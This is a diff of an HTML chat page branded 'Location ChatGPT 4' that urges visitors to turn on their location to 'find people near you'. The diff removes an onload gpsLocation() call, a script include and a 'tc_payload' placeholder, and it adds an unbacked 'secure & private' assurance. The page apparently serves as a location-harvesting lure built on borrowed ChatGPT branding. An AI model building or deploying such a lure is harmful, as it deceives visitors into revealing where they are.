@@ -1,51 +1,58 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Find - people</title>
-  <link rel="stylesheet" href="./style.css">
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Find - People</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
-<body onload="gpsLocation()">
-<section class="msger">
-  <header class="msger-header">
-    <div class="msger-header-title">
-      <i class="fas fa-comment-alt"></i> Location ChatGPT 4
-    </div>
-    <div class="msger-header-options">
-      <span><i class="fas fa-cog"></i></span>
-    </div>
-  </header>
 
-  <main class="msger-chat">
-    <div class="msg left-msg">
-      <div
-       class="msg-img"
-       style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"
-      ></div>
+<body>
+  <!-- Floating Particles -->
+  <div class="particles" id="particles"></div>
 
-      <div class="msg-bubble">
-        <div class="msg-info">
-          <div class="msg-info-name">Admin</div>
-          <div class="msg-info-time"></div>
-        </div>
+  <section class="msger">
+    <header class="msger-header">
+      <div class="msger-header-title">
+        <i class="fas fa-map-marker-alt"></i>
+        Location ChatGPT 4
+      </div>
+      <div class="msger-header-options">
+        <span><i class="fas fa-cog"></i></span>
+      </div>
+    </header>
 
-        <div class="msg-text">
-          Hi Welcome to Location GPT-4. Turn on your location for find people near you.📍
+    <main class="msger-chat">
+      <div class="msg left-msg">
+        <div class="msg-img"></div>
+        <div class="msg-bubble">
+          <div class="msg-info">
+            <div class="msg-info-name">🤖 Location GPT</div>
+            <div class="msg-info-time"></div>
+          </div>
+          <div class="msg-text">
+            Hi! 👋 Welcome to Location GPT-4.
+            <br>
+            <strong>Turn on your location</strong> to find people near you! 📍
+            <br>
+            <span>Your location is secure & private ✨</span>
+          </div>
         </div>
       </div>
-    </div>
+    </main>
 
-  </main>
+    <form class="msger-inputarea">
+      <input
+        type="text"
+        class="msger-input"
+        placeholder="Ask me anything about people nearby... 👀"
+      >
+      <button type="submit" class="msger-send-btn">
+        <i class="fas fa-paper-plane"></i> Send
+      </button>
+    </form>
+  </section>
 
-  <form class="msger-inputarea">
-    <input type="text" class="msger-input" placeholder="Ask me anything...">
-    <button type="submit" class="msger-send-btn">Send</button>
-  </form>
-</section>
-<script  src="./script.js"></script>
-<p id="techchip"></p>
-<!-- tc_payload -->
-
+  <p id="techchip">Powered by Murari </p>
 </body>
 </html>
